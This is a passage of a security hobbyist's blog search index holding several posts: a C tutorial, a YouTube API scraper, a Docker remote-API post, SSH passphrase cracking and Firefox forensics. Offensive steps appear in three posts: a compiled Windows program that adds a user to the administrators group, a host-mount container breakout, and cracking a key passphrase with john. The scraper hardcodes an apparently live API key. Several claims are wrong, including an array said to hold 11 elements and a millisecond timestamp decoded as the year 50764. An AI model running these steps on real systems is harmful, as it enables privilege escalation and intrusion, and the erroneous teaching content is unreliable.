input/outputlibrary, where ‘stdio.h’ is the name of the library’s header file.#include &lt;stdio.h&gt;Now, some brief notes about the C program: it consists of functions and variables. A function contains statements that specify the computingoperations, and variables store values used during the computation. Communication between the functions is by arguments and values returned by the functions, and through external variables.The return statement defines a value to be returned from the called function to its caller.You can name your functions however you want, with the exception of the name‘main’. Function called ‘main’ is special - your program begins executingat the beginning of the main. This means that every program must have a maindefined somewhere in code.#include &lt;stdio.h&gt;int main() { printf(\"Goodbye, World!\"); return 0;}When we write int main() we are stating that our program will return and integer. The number returned by the function indicates whether theprogram we wrote worked correctly. A return of 0 mean our programmed returnedsuccessfully, a number greater than 0 means it failed. Every line in C must endwith a semicolon, so that the compiler knows that a new line has started.VariablesTypesThere are only a few basic data types in C: char - single byte, capable of holding one character in the local character set. int - integer, typically reflecting the natural size of integers on the host machine. float - single-precision floating point. double - double-precision floating point In addition, there are a number of qualifiers that can be applied to thesebasic types. short and long apply to integers:short int var_one;long int var_two;Note: ‘int’ can be omitted in these declarations.Defining variablesAll variables must be declared before use, although certain declarations canbe made implicitly by content. A declaration specifies a type, and contains alist of one or more variables of that type, as inint lower, upper, step;char c, line[1000];For whole numbers, int type is used, which an integer in the size of a “word”the default number size of the machine which your program is compiled on. Onmost computers today, it is a 32-bit number, which means the number can rangefrom -2,147,483,648 to 2,147,483,647.int a = 0,b = 1,c = 2,d = 3, e = 4;a = b - c + d * e;printf(\"%d\", a); /* will print 1-2+3*4 = 11 */Declaring Stringschar name[] = \"John Smith\";/* is the same as */char name[11] = \"John Smith\";The reason that we need to add one, although the string John Smith is exactly 10 characters long, is for the string termination, a special character (equal to 0) which indicates the end of the string. The end of the string is marked because the program does not know the length of the string - only the compiler knows it according to the code.Using a pointer to define a simple string. This method creates a string which can only be used for readingchar * name = \"John Smith\";String formatting with printfchar * name = \"John Smith\";int age = 27;/* prints out 'John Smith is 27 years old.' */printf(\"%s is %d years old.\\n\", name, age)String Length - The function strlen returns the length of the string which has to be passed as an argument:char * name = \"Nikhil\";printf(\"%d\\n\",strlen(name));OperatorsUnary operatorsUnary operators are placed as prefix relative to operands and operate onsingle a operand. E.g. incrementing a ‘var’ variable with ‘++’ operator.:++var;Increment and decrement operators** ++ ** - Increment operatror-** – ** - Decremet operator.Address and indirection operators** &amp; ** - Address Operator. Yields the address of the operand.** * ** - Indirection operator. Yields the object or function to which its operand points, also known as pointer.** + ** - Unary Plus Operator. Yields the value of the operand, which must be of arithmetic type.** - ** - Unary Minus Operator. Yields the negative value of the operand, which must be of arithmetic type.** ~ ** - One’s Complement Operator. Yields the complement value of the operand, which must be of integral type.** ! ** - Logical Negation Operator. Yields 1 if the value of its operand compares equal to 0, and 0 otherwise.** sizeof ** -Sizeof Operator. Yields the number of bytes required to store an object of the type of its operand.Multiplicative operators** * ** - Multiplication Operator. Yields the multiple of two operands, both of whcih must be of arithmetic type.** / ** - Division Operator. Yields the divison of first by the second operand, both of which must be of arithmetic type.** % ** Remainder Operator. Yields the remainder of divison of first operand by the second, both of which must be of integral type.Additive OperatorsIf the operands have arithmetic type, the usual arithmetic conversions are performed.** + ** - Yields the sum of operands.** - ** - Yields the value of the first operand subtracted by the value of second.Shift OperatorsEquality OperatorsRelational operatorsBitwise AND OperatorBitwise Exclusive OR OperatorLogical AND OperatorLogical OR OperatorConditional OperatorAssignment OperatorsComma OperatorArraysAn ‘array’ type variable is a contiguously allocated nonempty set of objects,alos called elements, with a particular member object type. Each object canbe accessed via subscript, also called index, number. In C, index number starts from 0 since itreferences a memory location offset by n objects away from the first element.Arrays are defined in a very straightforward syntax:int numbers[10];The example above defines an array containing 11 objects, indexed from 0 to10, of type ‘int’.We can assign and retrive as follows://int numbers[10];/* populate the array */numbers[0] = 10;numbers[1] = 20;numbers[2] = 30;numbers[3] = 40;numbers[4] = 50;numbers[5] = 60;numbers[6] = 70;/* print the 7th number from the array, which has an index of 6 */printf(\"The 7th number in the array is %d\", numbers[6]);Here is the general form of a multidimensional array declaration:type arrayName [x][y];Initialise a two dimensional arrayint a[3][4] = { {0, 1, 2, 3} , /* initializers for row indexed by 0 */ {4, 5, 6, 7} , /* initializers for row indexed by 1 */ {8, 9, 10, 11} /* initializers for row indexed by 2 */};The inside braces, which indicates the wanted row, are optional. The following initialization is the same to the previous example.int a[3][4] = {0,1,2,3,4,5,6,7,8,9,10,11};Let’s access a two-dimensional elementint val = a[2][3];Example program using multidimensional arrays #include &lt;stdio.h&gt; int main() { int grades[2][5]; float average; int i; int j; grades[0][0] = 80; grades[0][1] = 70; grades[0][2] = 65; grades[0][3] = 89; grades[0][4] = 90; grades[1][0] = 85; grades[1][1] = 80; grades[1][2] = 80; grades[1][3] = 82; grades[1][4] = 87; for (i = 0; i &lt; 2; i++) { average = 0; for (j = 0; j &lt; 5; j++) { average += grades[i][j]; } average /= 5.0; printf(\"The average marks obtained in subject %d is: %.2f\\n\", i, average); } return 0; }Selection (Conditional) statementsA selection statement is a flow of control mechanism which selects among a set of substatements depending on the value of a controlling expression. The first substatement whose conditional expression, which must be arithmetic or pointer type, is evaluated to be unequal to 0 is executed.Selection statement can be in three forms://pseudocodeif (expression) statementif (expression) statement else statementswitch (expression) statementIn the follwoing example:if ( var &lt; 4 ) { printf( \"var is less than 4.\" );} else { printf( \"var is larger than 4.\" );}LoopsFor LoopsUsing a for loop to iterate over a block 10 times.int i;for (i = 0; i &lt; 10; i++) { printf(\"%d\\n\", i);}For loops can iterate over arraysint array[10] = { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 };int sum = 0;int i;for (i = 0; i &lt; 10; i++) { sum += array[i];}/* sum now contains a[0] + a[1] + ... + a[9] */printf(\"Sum of the array is %d\\n\", sum);While LoopsWhile loops are like for loops but have less functionality. A while loop continues executing the while block as long as the condition in the while holds true.int n = 0;while (n &lt; 10) { n++;}While loops can also execute infinitely if a condition is given which always evaluates as true (non-zero):while (1) { /* do something */}NOTE: the break and continue directives.The break directive halts a loop after ten loops, even though the while loop never finishes:int n = 0;while (1) { n++; if (n == 10) { break; }}In the following code, the continue directive causes the printf command to be skipped, so that only even numbers are printed out:int n = 0;while (n &lt; 10) { n++; /* check that n is odd */ if (n % 2 == 1) { /* go back to the start of the while block */ continue; } /* we reach this code only if n is even */ printf(\"The number %d is even.\\n\", n);}Functions Functions receive either a fixed or variable amount of arguments. Functions can only return one value, or return no value.Example function definitionint foo(int bar) { /* do something */ return bar * 2;}int main() { foo(1);}In C, functions must be first defined before they are used in the code. They can be either declared first and then implemented later on using a header file or in the beginning of the C file, or they can be implemented in the order they are used (less preferable).The correct way to use functions is as follows:/* function declaration */int foo(int bar);int main() { /* calling foo from main */ printf(\"The value of foo is %d\", foo(1));}int foo(int bar) { return bar + 1;}We can also create functions that do not return a value by using the keyword void:void moo() { /* do something and don't return a value */}int main() { moo();}Static Variables, Refercences and PointersWhat is a static variable?By default, variables are local to the scope in which they are defined. Variables can be declared as static to increase their scope up to file containing them. As a result, these variables can be accessed anywhere inside a file.References And PointersA pointer is essentially a simple integer variable which holds a memory address that points to a value, instead of holding the actual value itself.Dereferencing is the act of referring to where the pointer points at.#include &lt;stdio.h&gt;int main() { /* define a local variable a */ int a = 1; /* define a pointer variable, and point it to a using the &amp; operator */ int * pointer_to_a = &amp;a; printf(\"The value a is %d\\n\", a); /* 1 */ printf(\"The value of a is also %d\\n\", *pointer_to_a); /* 1 */ printf(\"The address of a is %d\\n\", pointer_to_a); /* 713939084*/ printf(\"The address of a is %d\\n\", &amp;a); /* 713939084*/ return 0;}StructuresC structures are special, large variables which contain several named variables inside. Structures are the basic foundation for objects and classes in C. Structures are used for: Serialization of data Passing multiple arguments in and out of functions through a single argument Data structures such as linked lists, binary trees, and moreDefining a structurestruct point { int x; int y;}Declaring a struct upfront and then building it on the flystruct point p;p.x = 10;p.y = 5;draw(p);Example of struct and typedeftypedef struct { char * brand; int model;} vehicle;vehicle mycar;mycar.brand = \"Ford\";mycar.model = 2007;Function arguments by referenceFunction arguments are passed by value, which means they are copied in and out of functions. But what if we copied pointers to values instead of the values themselves? This will enable us to give functions control over variables and structures of the parent functions, and not just a copy of them.Because we pass in the memory location and reference it inside via a pointer, this example allows us to increment n outside of the functionvoid addone(int * n) { (*n)++;}int n;printf(\"Before: %d\\n\", n);addone(&amp;n);printf(\"After: %d\\n\", n);CompilingCompile C code.gcc -o output.c input.cCross compile C code, compile 32 bit binary on 64 bit Linux.gcc -m32 -o output.c input.cCompile a binary for Windows on Linuxi686-w64-mingw32-gcc -o program.exe mycode.cUseful SnippetsAn add windows user programcat useradd.c/* system, NULL, EXIT_FAILURE */#include &lt;stdlib.h&gt;int main (){int i;i=system (\"net localgroup administrators myuser /add\");return 0;}Now we compile this while on Linuxi686-w64-mingw32-gcc -o adduser.exe useradd.c" }, { "title": "Making A YouTube Scraper", "url": "/posts/making-a-youtube-scraper/", "categories": "tutorial", "tags": "powershell", "date": "2021-08-25 00:00:00 +0100", "snippet": "Making A YouTube ScraperPowerShellWhat do we need: Get an API Credential for Youtube Query the data from Google API** Get API Credential for YouTube **Step 1First navigate to the following page t...", "content": "Making A YouTube ScraperPowerShellWhat do we need: Get an API Credential for Youtube Query the data from Google API** Get API Credential for YouTube **Step 1First navigate to the following page to setup the Google API https://console.developers.google.com/apis/dashboardStep 2Create a new project Setting Up a New ProjectStep 3Then click on Enable APIs and Services. We will need to search for the Youtube API to specify the scope of access. Enabling APIs and ServicesStep 4Search for Youtube and select Youtube Data API v3, then select ENABLE. You Need to Enable API Access in Order to Use itStep 5Finally, click on Credentials on the left side, then select Create Credential Select Credentials From The Left Sidebar Select Create Credentials to Generate New Credentials For The ProjectStep 6We are presented with two choices. If in doubt you can select “Help me choose” Create Credentials DropdownStep 7In this tutorial we will be scraping public data so select that radio option. Hit Next to Configure Public Data AccessAfter hitting ‘Next’ you should be presented with the following screen. Once Step 8Click on done to be returned to the dashboard. Copy Google API Credentials From The DashboardStep 9Select your API Key and open up PowerShellQuerying data from the YouTube APIYou can find more information on the YouTube API at the following URL: https://developers.google.com/youtube/v3/docs/Step 1In the first example we will use gather a list of videos for the the EminemVEVO user. In order to get a list of videos we first need a channel ID which we can search for by username. Once we have the channel ID and the number of videos on the channel we can request a list of videos. Using PowerShell ISE to Query The EminemVEVO YouTube ChannelHere is the example code.```bash# Get the API Key$GoogleApiKey = 'REDACTED'# Query Google API for the details of the EminemVEVO channel$data = Invoke-RestMethod -uri \"https://youtube.googleapis.com/youtube/v3/channels?part=snippet&amp;part=statistics&amp;part=status&amp;forUsername=EminemVEVO&amp;key=$GoogleApiKey\" | Select-Object -expand items$channelId = $data.id$maxResults = $data.statistics.videoCount# Now we can use the search method to search for all the eminem videos in this channel$eminem = Invoke-RestMethod -uri \"https://www.googleapis.com/youtube/v3/search?channelId=$channelId&amp;order=date&amp;part=snippet&amp;type=video&amp;maxResults=$maxResults&amp;key=$GoogleApiKey\" | Select-Object -expand items# List all eminem videos by title$eminem | ForEach-Object { $_.snippet.title }```The output of this command gives us the following.```bashEminem - Killer (Remix) [Official Audio] ft. Jack Harlow, CordaeEminem - Alfred&amp;#39;s Theme (Lyric Video)Eminem - Godzilla (Lyric Video) ft. Juice WRLDEminem - Darkness (Official Video)Eminem - Good Guy (Behind The Scenes) ft. Jessie ReyezEminem - Good Guy ft. Jessie ReyezEminem - VenomEminem - Lucky You ft. Joyner LucasEminem - FallEminem - FramedEminem - Nowhere Fast (Extended Version) [Audio] ft. KehlaniEminem - River (Behind the Scenes) ft. Ed SheeranEminem - Untouchable (Lyric Video)Eminem - River ft. Ed Sheeran (Official Video)Eminem - River (Trailer: Boxing) ft. Ed SheeranEminem - Walk On Water ft. Beyoncé (Official Behind The Scenes Video)Eminem - Walk On Water (Official Video)Eminem - River (Audio) ft. Ed SheeranEminem ft. Beyoncé - Walk On Water (Official Lyric Video)Eminem - Untouchable (Audio)Walk On Water/Stan/Love The Way You Lie (Medley/Live From Saturday Night Live/2017)Eminem - Walk On Water (Audio) ft. BeyoncéEminem - Partners In Rhyme: The True Story of Infinite (Official Trailer)Eminem - Infinite (F.B.T. Remix) (Official Audio)Eminem - Phenomenal (Behind The Scenes)Eminem - PhenomenalEminem - Kings Never Die (Lyric Video) ft. Gwen StefaniEminem - Kings Never Die (Audio) ft. Gwen StefaniEminem - Phenomenal (Lyric Video)Detroit Vs. Everybody (Behind The Scenes)Detroit Vs. Everybody (Lyric Video)Eminem, Royce da 5&amp;#39;9&amp;quot;, Big Sean, Danny Brown, Dej Loaf, Trick Trick - Detroit Vs. EverybodyEminem - Eminem Interview (CD:UK)Eminem, Slaughterhouse, Yelawolf - CXVPHER (Behind The Scenes)Eminem - Guts Over Fear ft. Sia (Official Video)Vevo Presents: Shady CXVPHER (Official Video)Detroit Vs. EverybodyVevo Presents: SHADY CXVPHEREminem - Guts Over Fear ft. Sia (Lyric Video)Eminem - Guts Over Fear (Audio) ft. SiaEminem - Headlights ft. Nate Ruess (Official Music Video)Eminem - The Monster Explained (Behind The Scenes) ft. RihannaEminem - The Monster (Edited) ft. RihannaEminem ft. Rihanna - The Monster (Explicit) [Official Video]Eminem - The Monster (Teaser) ft. RihannaEminem - Rap God (Explicit)Eminem - Survival (Live on SNL)Eminem - Berzerk (Live on SNL)Eminem - The Monster ft. Rihanna (Audio)Eminem - Survival (Explicit)```Step 2I am aware Eminem might not to be everyone’s taste so in this second example we will list ippsec videos. Here we have the channel ID hardcoded. Using PowerShell ISE to Query The IppSec YouTube ChannelThe example code# Get the API Key$GoogleApiKey = 'AIzaSyCAhq9IRVmDccixZlOvQ9FFYAWx7Hx3yvY'$channelId = 'UCa6eh7gCkpPo5XXUDfygQQA'$maxResults = 100# Now we can use the search method to search for all the eminem videos in this channel$ippsec = Invoke-RestMethod -uri \"https://www.googleapis.com/youtube/v3/search?channelId=$channelId&amp;order=date&amp;part=snippet&amp;type=video&amp;maxResults=$maxResults&amp;key=$GoogleApiKey\" | Select-Object -expand items# List all eminem videos by title$ippsec | ForEach-Object { $_.snippet.title }This gives us the following output.HackTheBox - ProperHackTheBox - Crossfit2HackTheBox - LoveHackTheBox - TheNotebookHackTheBox - ArmageddonHackTheBox - BreadcrumbsHackTheBox - AtomHackTheBox - OphiuchiHackTheBox - SpectraHackTheBox - TentacleHackTheBox - TenetHackTheBox - ScriptKiddieHackTheBox - CerealHackTheBox - DeliveryHackTheBox - ReadyHackTheBox - AttendedHackTheBox - SharpHackTheBox - BucketHackTheBox - LaboratoryHackTheBox - APTHackTheBox - TimeHackTheBox - LuanneHackTheBox - CrossfitHackTheBox - Reel2HackTheBox - PassageHackTheBox - AcademyHackTheBox - FelineHackTheBox - JewelHackTheBox - DoctorHackTheBox - WorkerHackTheBox - CompromisedHackTheBox - Rope2HackTheBox - OmniHackTheBox - LaserHackTheBox - OpenKeySHackTheBox - UnbalancedHackTheBox - SneakyMailerHackTheBox - BuffHackTheBox - IntenseHackTheBox - Academy IntroHackTheBox - TabbyHackTheBox - FuseHackTheBox - DyplesherHackTheBox - BlunderHackTheBox - CacheHackTheBox - BlackfieldHackTheBox - AdmirerHackTheBox - MultimasterHackTheBox - TravelHackTheBox - Remote" }, { "title": "Linux File Formatting", "url": "/posts/linux-file-formatting/", "categories": "tutorial", "tags": "linux", "date": "2021-08-18 00:00:00 +0100", "snippet": "tabs to spaces (by default without the t it is 8 spaces)expand -t 4 &lt;file&gt; &gt; &lt;new_file&gt;Leading tabs only we add the i optionhttps://linuxhandbook.com/convert-tabs-spaces/", "content": "tabs to spaces (by default without the t it is 8 spaces)expand -t 4 &lt;file&gt; &gt; &lt;new_file&gt;Leading tabs only we add the i optionhttps://linuxhandbook.com/convert-tabs-spaces/" }, { "title": "Advanced Phishing Tactics", "url": "/posts/advanced-phishing-tactics/", "categories": "article", "tags": "red-teaming", "date": "2021-08-17 00:00:00 +0100", "snippet": "", "content": "" }, { "title": "Securely Accessing Remote Docker Host", "url": "/posts/securely-accessing-remote-docker-host/", "categories": "article", "tags": "docker", "date": "2021-08-16 00:00:00 +0100", "snippet": "Docker is running out box without the socket setevilsaint@marvel.lab:~# docker psCannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?evilsaint@marvel.la...", "content": "Docker is running out box without the socket setevilsaint@marvel.lab:~# docker psCannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?evilsaint@marvel.lab:~# docker imagesCannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?Nmap Scan showing exposed Docker API port.nmap -sSV -p- 192.190.96.3Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-17 00:34 ISTNmap scan report for docker-host (192.190.96.3)Host is up (0.000015s latency).Not shown: 65532 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)2375/tcp open docker Docker 19.03.1 (API 1.40)2376/tcp open tcpwrappedMAC Address: 02:42:C0:BE:60:03 (Unknown)Service Info: OSs: Linux, linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 9.11 secondsDefine the DOCKER_HOST environment variable to point to this remote TCP socket.export DOCKER_HOST=192.190.96.3:2375Now we can mount the image to the host volume and do a host breakout if permissions are in placeevilsaint@marvel.lab:~# docker run -it -v /:/host ubuntu:18.04 bashroot@6a01ea2ace07:/# chroot /host#How can we secure thisI will SSH into the remote host to perform the fixLet us kill the dockerps -ef | grep dockerkill &lt;pid&gt;Restart the docker serviceservice docker startNow we export the docker host to be accessible over SSHroot@localhost:~# export DOCKER_HOST=ssh://root@192.190.96.3" }, { "title": "Cracking SSH Private Key Passphrase", "url": "/posts/cracking-ssh-private-key-passphrase/", "categories": "article", "tags": "ssh", "date": "2021-08-13 00:00:00 +0100", "snippet": "root@evilsaint:~# file id_rsaid_rsa: PEM RSA private keyroot@evilsaint:~# whereis ssh2johnssh2john: /usr/sbin/ssh2johnroot@evilsaint:~# locate ssh2john/usr/sbin/ssh2johnroot@evilsaint:~# ssh2john i...", "content": "root@evilsaint:~# file id_rsaid_rsa: PEM RSA private keyroot@evilsaint:~# whereis ssh2johnssh2john: /usr/sbin/ssh2johnroot@evilsaint:~# locate ssh2john/usr/sbin/ssh2johnroot@evilsaint:~# ssh2john id_rsa &gt; converted_hashroot@evilsaint:~# john --wordlist=/usr/share/wordlists/rockyou.txt converted_hashUsing default input encoding: UTF-8Loaded 1 password hash (SSH [RSA/DSA 32/64])Press 'q' or Ctrl-C to abort, almost any other key for statusrevenge2 (id_rsa)1g 0:00:00:00 DONE (2021-08-13 21:13) 2.702g/s 636721p/s 636721c/s 636721C/s revenge2Use the \"--show\" option to display all of the cracked passwords reliablySession completedroot@evilsaint:~# john converted_hash --showid_rsa:revenge21 password hash cracked, 0 left" }, { "title": "Firefox Browser Forensics", "url": "/posts/firefox-browser-forensics/", "categories": "article", "tags": "browser", "date": "2021-08-12 00:00:00 +0100", "snippet": "Firefox: HistorySQLite Database Inside the places.sqlite database file, there are two tables, moz_places and moz_annos, that store information needed to find downloaded filescontent-prefs.sqlite: ...", "content": "Firefox: HistorySQLite Database Inside the places.sqlite database file, there are two tables, moz_places and moz_annos, that store information needed to find downloaded filescontent-prefs.sqlite: stores site-specific content preferences.cookies.sqlite: stores cookie data.formhistory.sqlite: stores form input data.permissions.sqlite: stores site-specific permissions.places.sqlite: stores the history of visited sites.webappstore.sqlite: stores Document Object Model (DOM) storage data.Note: This list was compiled from multiple sources. Not all files for every system are listed, and some files on this list may not be found on other systems.Locate the Mozilla storage files.student@attackdefense:/$ cd ~/.mozilla/firefox/zevp8nk2.default/student@attackdefense:~/.mozilla/firefox/zevp8nk2.default$ ls *.sqlitecontent-prefs.sqlite favicons.sqlite kinto.sqlite places.sqlite storage.sqlitecookies.sqlite formhistory.sqlite permissions.sqlite storage-sync.sqlite webappsstore.sqlitestudent@attackdefense:~/.mozilla/firefox/zevp8nk2.default$ sqlite3 places.sqliteSQLite version 3.11.0 2016-02-15 17:29:24Enter \".help\" for usage hints.sqlite&gt;We can query all recordssqlite&gt; select * from moz_places;1|https://support.mozilla.org/en-US/products/firefox||gro.allizom.troppus.|0|0|0|137||iZpT3cYccuf2|1|47357795150914||2|https://www.mozilla.org/en-US/firefox/customize/||gro.allizom.www.|0|0|0|137||mkU9pzj7KxEp|1|47357014640010||3|https://www.mozilla.org/en-US/contribute/||gro.allizom.www.|0|0|0|137||qFX_kGoubYl7|1|47358034485371||4|https://www.mozilla.org/en-US/about/||gro.allizom.www.|0|0|0|137||gHDaQFcqAxTO|1|47358774953055||5|http://www.ubuntu.com/||moc.utnubu.www.|0|0|0|137||1-dNfm-NfyWA|1|125508050257634||6|http://wiki.ubuntu.com/||moc.utnubu.ikiw.|0|0|0|137||4Em1q9WFjljD|1|125511519733047||We can use SQL queries to interactselect * from moz_places where url like '%releases.ubuntu.com%';Querying The DatabaseCounting the unique hosts.sqlite&gt; select count(*) from moz_hosts;36sqlite&gt;Historyselect * from moz_historyvisits where place_id=41;Table Schemasqlite&gt; .schemaRetrieving SchemaLoginscat logins.json | jqcat logins.json | python -m json.toolconsultant@evilsaint:~/.mozilla/firefox/esdp8nk2.default$ cat logins.json | python -m json.tool{ \"disabledHosts\": [], \"logins\": [ { \"encType\": 1, \"encryptedPassword\": \"REDACTED\", \"encryptedUsername\": \"REDACTED\", \"formSubmitURL\": null, \"guid\": \"{eedbf6dd-588b-46c5-b122-1999171667f6}\", \"hostname\": \"chrome://FirefoxAccounts\", \"httpRealm\": \"Firefox Accounts credentials\", \"id\": 1, \"passwordField\": \"\", \"timeCreated\": 1539732575514, \"timeLastUsed\": 1539732575514, \"timePasswordChanged\": 1539732624376, \"timesUsed\": 1, \"usernameField\": \"\" }, { \"encType\": 1, \"encryptedPassword\": \"REDACTED\", \"encryptedUsername\": \"REDACTED\", \"formSubmitURL\": \"https://github.com\", \"guid\": \"{ccd2077a-2f06-406a-bf42-d8848243c86f}\", \"hostname\": \"https://github.com\", \"httpRealm\": null, \"id\": 2, \"passwordField\": \"password\", \"timeCreated\": 1539733882060, \"timeLastUsed\": 1539733882060, \"timePasswordChanged\": 1539820282060, \"timesUsed\": 1, \"usernameField\": \"login\" } ], \"nextId\": 5, \"version\": 2}Time GitHub Password changeddate -d @1539820282060# Fri Dec 18 00:07:40 UTC 50764" }, { "title": "FFmpeg Cheat Sheet", "url": "/posts/ffmpeg-cheat-sheet/", "categories": "article", "tags": "cheat-sheet, ffmpeg, mp3, wav, wma", "date": "2021-07-02 00:00:00 +0100", "snippet": "Installing FFMpegapt-get install ffmpegConverting Audio into Different Formats / Sample RatesMinimal example: transcode from MP3 to WMA:ffmpeg -i input.mp3 output.wmaYou can get the list of support...", "content": "Installing FFMpegapt-get install ffmpegConverting Audio into Different Formats / Sample RatesMinimal example: transcode from MP3 to WMA:ffmpeg -i input.mp3 output.wmaYou can get the list of supported formats with:ffmpeg -formatsYou can get the list of installed codecs with:ffmpeg -codecsConvert WAV to MP3, mix down to mono (use one audio channel), set bit rate to 64 kbps and sample rate to 22050 Hz:ffmpeg -i input.wav -ac 1 -ab 64000 -ar 22050 output.mp3Convert any MP3 file to WAV 16khz mono 16bit:ffmpeg -i 111.mp3 -acodec pcm_s16le -ac 1 -ar 16000 out.wavConvert any MP3 file to WAV 20khz mono 16bit for ADDAC WAV Player:ffmpeg -i 111.mp3 -acodec pcm_s16le -ac 1 -ar 22050 out.wavcd into dir for the batch process:for i in *.mp3; do ffmpeg -i \"$i\" -acodec pcm_s16le -ac 1 -ar 22050 \"${i%.mp3}-encoded.wav\"; donePicking the 30 seconds fragment at an offset of 1 minuteffmpeg -i input.mp3 -ss 60 -t 30 output.wavIn HH:MM:SS formatffmpeg -i input.mp3 -ss 0:01:00 -t 0:00:30 output.wavSplit an audio stream at a specified segment rate (e.g. 3 seconds)ffmpeg -i somefile.mp3 -f segment -segment_time 3 -c copy out%03d.mp3Extract Audio-vn signals no video. -acodec copy says to use the same audio stream that’s already in there.ffmpeg -i input-video.avi -vn -acodec copy output-audio.aac The -i option is the input file/path. The -f specifies the format (in this case mp3 and the -ab 192000 tells FFmpeg that we want the output to be encoded at 192Kbps, and as we learnt the last example -vn means we do not want video.ffmpeg -i video.mp4 -f mp3 -ab 192000 -vn music.mp3Replace Audio on a Video without re-encoding.Preferred methodffmpeg -i INPUT.mp4 -i AUDIO.wav -shortest -c:v copy -c:a aac -b:a 256k OUTPUT.mp4Strip audio stream away from the video.ffmpeg -i INPUT.mp4 -codec copy -an OUTPUT.mp4Combine the two streams (new audio with originally existing video).ffmpeg -i 36.MOV -i 36.wav -map 0:v -map 1:a -c copy -y 36-encoded.movOr add an offset to audio.ffmpeg -i 36.MOV -itsoffset -0.25 -i 36.wav -map 0:v -map 1:a -c copy -y 36-encoded.mov We can leave the audio format detection up to FFmpeg?To convert one file: ffmpeg -i videofile.mp4 -vn -acodec libvorbis audiofile.ogg To convert many files: for vid in *.mp4; do ffmpeg -i \"$vid\" -vn -acodec libvorbis \"${vid%.mp4}.ogg\"; done You can, of course, select any FFmpeg parameters for audio encoding that you like, set things like bitrate, etc.Use -acodec libmp3lame and change the extension from .ogg to .mp3 for mp3 encoding.If you want to extract the audio, you can “copy” the audio track to a file using -acodec copy. Of course, the main difference is that transcoding is slow and CPU-intensive, while copying is speedy as you’re just moving bytes from one file to another. Here’s how to copy just the audio track (assuming it’s in mp3 format): ffmpeg -i videofile.mp4 -vn -acodec copy audiofile.mp3 Note that in this case, the audio file format has to be consistent with what the container has (i.e. if the audio is AAC format, you have to say audiofile.aac). You can use the ffprobe command to see which formats you have; this may provide some information: for file in *; do ffprobe $file 2&gt;&amp;1 |grep Audio; done A possible way to automatically parse the audio codec and name the audio file accordingly would be for file in *mp4 *avi; do ffmpeg -i \"$file\" -vn -acodec copy \"$file\".```ffprobe \"$file\" 2&gt;&amp;1 |sed -rn 's/.*Audio: (...), .*/\\1/p'```; done Note that this command uses sed to parse output from ffprobe for each file. It assumes a 3-letter audio codec such as mp3, ogg or aac for example and will break if given anything different.Encoding multiple filesYou can use a Bash “for loop” to encode all files in a directory:mkdir newfilesfor f in *.m4a; do ffmpeg -i \"$f\" -codec:v copy -codec:a libmp3lame -q:a 2 newfiles/\"${f%.m4a}.mp3\"; donem4a to mp3 conversion with FFmpeg and lameffmpeg -i input.m4a -acodec libmp3lame -ab 128k output.mp3A batch file version of the same command would be:for f in *.m4a; do ffmpeg -i \"$f\" -acodec libmp3lame -ab 256k \"${f%.m4a}.mp3\"; doneExtract Single Image from a Video at Specified Framevf [ss][filename][outputFileName]where vf is a custom bash script as follows:ffmpeg -ss $1 -i $2 -qmin 1 -q:v 1 -qscale:v 2 -frames:v 1 -huffman optimal $3.jpgss offset = frame number divided by FPS of video = the decimal (in milliseconds) ffmpeg needs i.e. 130.5Merge Multiple VideosConcatenate multiple files.cat myvideos.txtfile '/path/to/file1'file '/path/to/file2'file '/path/to/file3'$ ffmpeg -f concat -safe 0 -i myvideos.txt -c copy output.mp4Split a Video into Imagesffmpeg -i video.flv image%d.jpgConvert Images into a Videoffmpeg -f image2 -i image%d.jpg imagestovideo.mp4ffmpeg -i image-%03d.png -c:v libx264 -pix_fmt yuv420p test.mp4ffmpeg -r 1/5 -i image-%03d.png -c:v libx264 -vf fps=25 -pix_fmt yuv420p test.mp4Convert Single Image into a Videoffmpeg -loop 1 -i image.png -c:v libx264 -t 60 -pix_fmt yuv420p -vf scale=1920:1080 out.mp4Convert non-sequentially named Images in a directoryffmpeg -framerate 30 -pattern_type glob -i '*.jpeg' -c:v libx264 -pix_fmt yuv420p gan-1.movConvert image sequence of many different sizes and conform to specific frame sizeffmpeg -i image-%04d.jpg -c:v libx264 -pix_fmt yuv420p -vf \"scale=max(1280\\,a*720):max(1280\\,720/a),crop=1280:720\" test.mp4Guarantee aspect ratio from the image sequenceffmpeg -i image-%04d.jpg -c:v libx264 -pix_fmt yuv420p -vf \"scale=720:-2\" test.mp4Evaluate which ratio to apply for scaling, then scale with the requisite amount of paddingffmpeg -i image-%04d.jpg -c:v libx264 -pix_fmt yuv420p -vf \"scale=iw*min(1280/iw\\,720/ih):ih*min(1280/iw\\,720/ih), pad=1280:720:(1280-iw*min(1280/iw\\,720/ih))/2:(720-ih*min(1280/iw\\,720/ih))/2\" test.mp41920 versionffmpeg -i image-%04d.jpg -c:v libx264 -pix_fmt yuv420p -vf \"scale=iw*min(1920/iw\\,1080/ih):ih*min(1920/iw\\,1080/ih), pad=1920:1080:(1920-iw*min(1920/iw\\,1080/ih))/2:(1080-ih*min(1920/iw\\,1080/ih))/2\" test.mp4Convert .mov (JPEG-A or other codec) to H264 .mp4ffmpeg -i input.mov -vcodec libx264 -pix_fmt yuv420p output.mp4Simple FLAC convertffmpeg -i audio.xxx -c:a flac audio.flacMix Stereo to MonoYou can modify a video file directly without having to re-encode the video stream. However, the audio stream will need to encoded again. If you want to use the right channel, write 0.1.1 instead of 0.1.0.Left channel to mono:ffmpeg -i video.mp4 -map_channel 0.1.0 -c:v copy mono.mp4Left channel to stereo:ffmpeg -i video.mp4 -map_channel 0.1.0 -map_channel 0.1.0 -c:v copy stereo.mp4Trim End of a File (mp3)This command will slice up to 30 seconds without transcoding:ffmpeg -t 30 -i inputfile.mp3 -acodec copy outputfile.mp3To Encode or Re-encode?Do you need to cut video with re-encoding or without re-encoding mode? You can try the following command.Synopsis: ffmpeg -i [input_file] -ss [start_seconds] -t [duration_seconds] [output_file]use FFmpeg cut mp4 video without re-encodingExample:ffmpeg -i source.mp4 -ss 00:00:05 -t 00:00:10 -c copy cut_video.mp4use FFmpeg cut mp4 video with 